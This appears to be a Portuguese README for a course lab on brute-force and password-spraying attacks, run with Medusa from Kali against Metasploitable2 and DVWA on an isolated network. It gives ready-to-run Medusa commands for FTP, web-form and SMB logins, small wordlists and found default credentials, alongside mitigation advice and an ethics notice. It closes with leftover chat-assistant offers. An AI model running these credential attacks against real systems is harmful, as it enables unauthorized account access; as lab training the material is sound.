# Brute-force Lab com Kali + Medusa (DIO Challenge)

> **Resumo:** Projeto de laboratório para entender ataques de força bruta em serviços comuns (FTP, formulário web/DVWA e SMB) usando **Kali Linux** como atacante e **Metasploitable2 / DVWA** como alvo. Todos os testes foram realizados em ambiente isolado (VirtualBox Host-Only / Internal). Este repositório serve como evidência e documentação técnica do desafio.

---

## Índice

* [Objetivo](#objetivo)
* [Ambiente e pré-requisitos](#ambiente-e-pré-requisitos)
* [Estrutura do repositório](#estrutura-do-repositório)
* [Wordlists utilizadas](#wordlists-utilizadas)
* [Comandos executados (exemplos)](#comandos-executados-exemplos)

  * [FTP](#ftp)
  * [HTTP / DVWA (form)](#http--dvwa-form)
  * [SMB / Password spraying](#smb--password-spraying)
* [Validação e coleta de evidências](#validação-e-coleta-de-evidências)
* [Resultados (exemplo)](#resultados-exemplo)
* [Recomendações de mitigação](#recomendações-de-mitigação)
* [Checklist para entrega](#checklist-para-entrega)
* [Aviso legal / Ética](#aviso-legal--ética)

---

## Objetivo

Documentar, executar e evidenciar ataques controlados de brute-force e password spraying usando Medusa em um laboratório isolado para praticar técnicas de auditoria e propor medidas de mitigação. Mostrar domínio das ferramentas, processos e das boas práticas de documentação técnica.

---

## Ambiente e pré-requisitos

* VirtualBox com duas VMs principais:

  * **Kali Linux** (atacante)
  * **Metasploitable2** (alvo) e/ou DVWA em uma VM web
* Rede: **Host-Only** (ou Internal Network) para isolar o laboratório
* Ferramentas no Kali:

  * `medusa` (força bruta)
  * `nmap` (reconhecimento)
  * `smbclient` (teste SMB)
  * `ftp` / `vsftpd` cliente para teste manual
  * `burpsuite` (opcional para inspecionar formulários web)

> **IPs de exemplo usados neste README:**
>
> * Alvo FTP / SMB: `192.168.56.101`
> * Alvo DVWA (HTTP): `192.168.56.102`

**Dica:** verifique/ajuste os IPs das suas VMs com `ip a` ou no VirtualBox.

---

## Estrutura do repositório (recomendada)

```
/your-project-repo
├─ README.md
├─ wordlists/
│  ├─ usernames.txt
│  └─ passwords.txt
├─ commands/
│  ├─ medusa_ftp_commands.txt
│  └─ medusa_http_commands.txt
├─ images/
│  ├─ ftp_success.png
│  └─ dvwa_success.png
├─ outputs/
│  └─ medusa_ftp_2025-10-15.log
└─ mitigation_recommendations.md
```

---

## Wordlists utilizadas

Coloque suas wordlists em `wordlists/`.

`wordlists/usernames.txt`

```
ftp
admin
msfadmin
user
test
```

`wordlists/passwords.txt`

```
123456
password
admin
msfadmin
qwerty
pass123
k@li2025
```

> Observação: essas listas são propositalmente pequenas para demonstração em laboratório. Para auditorias reais, utilize wordlists mais robustas (por exemplo, rockyou) sempre em ambiente autorizado.

---

## Comandos executados (exemplos)

Abaixo estão exemplos prontos para copiar/colar. Ajuste IPs e caminhos conforme seu ambiente.

### FTP

Teste de força bruta com Medusa (FTP):

```bash
# Salvar saída também em arquivo
medusa -h 192.168.56.101 -M ftp -U wordlists/usernames.txt -P wordlists/passwords.txt -t 10 -f | tee outputs/medusa_ftp_$(date +%F_%T).log
```

**Explicação:**

* `-h` host alvo
* `-M ftp` módulo para FTP
* `-U` arquivo com usernames
* `-P` arquivo com passwords
* `-t` número de threads
* `-f` para encerrar ao primeiro sucesso

---

### HTTP / DVWA (formulário web)

Medusa pode atacar formulários HTTP com o módulo `http` e especificação FORM. É necessário identificar:

* URL do endpoint de login (ex.: `/dvwa/login.php`)
* Campos do formulário (ex.: `username`, `password`)
* String que aparece na página quando o login falha (p.ex.: `Login failed` ou `Invalid Login`)

Exemplo genérico:

```bash
medusa -h 192.168.56.102 -M http -m FORM:POST:/dvwa/login.php:username=^USER^&password=^PASS^:Login\ failed -U wordlists/usernames.txt -P wordlists/passwords.txt -t 8 | tee outputs/medusa_dvwa_$(date +%F_%T).log
```

**Dicas:**

* Capture a requisição de login com Burp Proxy ou `curl -v` para confirmar os campos e a string de falha.
* Ajuste o `POST` path e a `failure string` conforme o comportamento do DVWA.

---

### SMB / Password spraying

Exemplo de password spraying (uma senha comum contra vários usuários):

```bash
medusa -h 192.168.56.101 -M smbnt -U wordlists/usernames.txt -p 'Summer2025!' -t 6 | tee outputs/medusa_smb_spray_$(date +%F_%T).log
```

Exemplo varrendo combinações username+password:

```bash
medusa -h 192.168.56.101 -M smbnt -U wordlists/usernames.txt -P wordlists/passwords.txt -t 6 | tee outputs/medusa_smb_$(date +%F_%T).log
```

**Atenção:** o SMB pode causar bloqueios de conta em sistemas com proteção. Em auditoria, documente pausas, janelas de tempo e impactos.

---

## Validação e coleta de evidências

Para cada caso bem-sucedido, colete evidências replicáveis:

1. **Salvar logs/saída do Medusa:** utilize `tee` para armazenar saída em `outputs/`.
2. **Capturas de tela:** terminal com Medusa mostrando sucesso, página DVWA após login bem-sucedido, cliente FTP/SMB conectado. Salve em `/images`.
3. **Verificação manual:**

   * FTP: `ftp 192.168.56.101` e tentar login com as credenciais encontradas.
   * SMB: `smbclient -L //192.168.56.101 -U usuário` para listar shares.
4. **Registro de metadados:** hora (timestamp), comando exato, versões (`medusa -V`, `nmap --version`, `uname -a`).
5. **Notas de impacto:** descreva se o serviço parou de responder, se houve bloqueio de conta, latência alta, etc.

---

## Resultados (exemplo de como documentar)

> **Data:** 2025-10-15

* **FTP (192.168.56.101):** usuário `msfadmin` encontrado com senha `msfadmin`. Comando usado: `medusa -h 192.168.56.101 -M ftp -U wordlists/usernames.txt -P wordlists/passwords.txt -t 10 -f`. Evidência: `outputs/medusa_ftp_2025-10-15.log`, `images/ftp_success.png`.

* **DVWA (192.168.56.102):** nenhum acesso crítico encontrado com as wordlists pequenas; recomenda-se testar com wordlists maiores para auditoria completa. Evidência: `outputs/medusa_dvwa_2025-10-15.log`, `images/dvwa_attempts.png`.

* **SMB (192.168.56.101):** password spraying com `Summer2025!` não retornou sucesso; varredura completa com `passwords.txt` gerou tentativas sem sucesso e sem bloqueio observado. Evidência: `outputs/medusa_smb_*.log`.

> Adapte a seção com seus próprios achados reais e inclua prints/logs.

---

## Recomendações de mitigação (detalhadas)

1. **Política de senhas fortes:** exigir comprimento mínimo (ex.: ≥12 caracteres), mistura de classes de caracteres e evitar senhas comuns.
2. **Bloqueio e rate-limiting:** aplicar bloqueio temporário após N (3–5) tentativas ou implementar backoff exponencial.
3. **MFA:** habilitar autenticação multifator sempre que possível.
4. **Monitoramento e alertas:** registrar tentativas de autenticação falhas e gerar alertas em picos incomuns.
5. **Hardening de serviços:** desabilitar FTP sem TLS (usar SFTP/FTPS), isolar SMB e aplicar listas de controle de acesso.
6. **Educação e Patching:** remover contas e senhas padrão (ex.: `msfadmin`) e aplicar atualizações do sistema.

---

## Checklist para entrega (use antes de clicar em "Entregar Projeto")

* [ ] Assistir a todas as vídeo-aulas recomendadas pelo curso.
* [ ] Repositório público no GitHub criado.
* [ ] README.md (este arquivo) preenchido e commitado.
* [ ] Wordlists e comandos em pastas `wordlists/` e `commands/` commitados.
* [ ] Logs e imagens relevantes em `outputs/` e `images/` (opcionalmente compactados se grande).
* [ ] Arquivo `mitigation_recommendations.md` com recomendações e observações.
* [ ] Link do repositório pronto para submeter.

---

## Aviso legal / Ética

Este repositório e todas as atividades descritas foram realizadas exclusivamente em ambiente controlado e isolado. Executar ataques, scans ou brute-force contra sistemas que você não possui ou sem permissão explícita é ilegal e antiético. Sempre opere dentro da lei e das políticas da sua organização.

---

## Próximos passos (sugestões)

* Expandir wordlists (por exemplo, usar `rockyou.txt`) para testes mais realistas (sempre em laboratório).
* Automatizar captura de evidências com scripts que salvem logs e prints.
* Repetir testes com diferentes configurações de rate-limiting para medir impacto.

---

Se quiser, posso:

* Gerar versões alternativas do README com mais/menos detalhes.
* Gerar um `mitigation_recommendations.md` separado com políticas prontas para copiar.
* Gerar scripts de automação que rodem os comandos e salvem logs automaticamente.

Boa sorte — e conte comigo para adaptar o README aos IPs/achados reais das suas VMs!

---

## Arquivos adicionais gerados

Abaixo estão os arquivos prontos para você copiar/colar no repositório (ou baixar manualmente a partir do canvas).

### mitigation_recommendations.md

```
# Recomendações de Mitigação - Brute-force Lab

## Resumo
Documento com recomendações práticas e políticas para reduzir o risco de ataques de brute-force e password spraying.

## Políticas Técnicas
1. **Complexidade e comprimento mínimo de senha**
   - Exigir senha com ao menos 12 caracteres e mistura de letras maiúsculas/minúsculas, números e símbolos.

2. **Bloqueio de conta e rate-limiting**
   - Implementar bloqueio de conta temporário após 3–5 tentativas falhas.
   - Aplicar backoff exponencial e limitar tentativas por IP/VPN.

3. **Autenticação Multifator (MFA)**
   - Habilitar MFA para contas com acesso a dados sensíveis e administrativo.

4. **Monitoramento e resposta**
   - Centralizar logs de autenticação em um SIEM.
   - Implementar alertas para padrões de brute-force (ex.: > X falhas em Y minutos).

5. **Proteção de serviços**
   - Desabilitar FTP sem TLS; preferir SFTP/FTPS.
   - Restringir SMB a redes internas e aplicar listas de controle de acesso.

6. **Gerenciamento de contas e credenciais**
   - Remover contas padrão e senhas pré-configuradas (ex.: msfadmin).
   - Forçar rotação periódica de credenciais críticas.

7. **Educação e processos**
   - Treinar equipes sobre criação de senhas e indicadores de comprometimento.
   - Procedimentos para resposta a incidentes envolvendo autenticação.

## Guia de Implementação Rápida
- Passo 1: Revisar e aplicar política de complexidade de senhas no LDAP/AD.
- Passo 2: Configurar bloqueio de conta e rate-limiting no gateway de autenticação.
- Passo 3: Habilitar MFA (TOTP, hardware token) para contas privilegiadas.
- Passo 4: Instrumentar logs em SIEM e criar alertas para tentativas repetidas.

## Controle de qualidade
- Auditar periodicamente com ferramentas autorizadas em ambiente controlado.
- Realizar testes de penetração internos com escopo e autorização.
```

---

### commands/medusa_ftp_commands.txt

```
# Comandos prontos: FTP
# Salvar saída em outputs/
medusa -h 192.168.56.101 -M ftp -U wordlists/usernames.txt -P wordlists/passwords.txt -t 10 -f | tee outputs/medusa_ftp_$(date +%F_%T).log

# Comando alternativo (sem parar no primeiro sucesso):
medusa -h 192.168.56.101 -M ftp -U wordlists/usernames.txt -P wordlists/passwords.txt -t 8 | tee outputs/medusa_ftp_full_$(date +%F_%T).log
```

---

### commands/medusa_http_commands.txt

```
# Comandos prontos: HTTP / DVWA (ajuste path/strings conforme seu DVWA)
medusa -h 192.168.56.102 -M http -m FORM:POST:/dvwa/login.php:username=^USER^&password=^PASS^:Login\ failed -U wordlists/usernames.txt -P wordlists/passwords.txt -t 8 | tee outputs/medusa_dvwa_$(date +%F_%T).log

# Se o site exigir um cookie de sessão ou CSRF, capture a requisição com Burp e replique os headers necessários ou use um script para reproduzir a sessão.
```

---

### Próximos passos sugeridos

* Posso também gerar **scripts Bash** que executem os comandos e salvem logs automaticamente (`run_tests.sh`) e um `gitignore` apropriado para não subir arquivos sensíveis.
* Quer que eu gere esses scripts agora no canvas? (Responda "sim" para que eu adicione `run_tests.sh` e `gitignore`.)
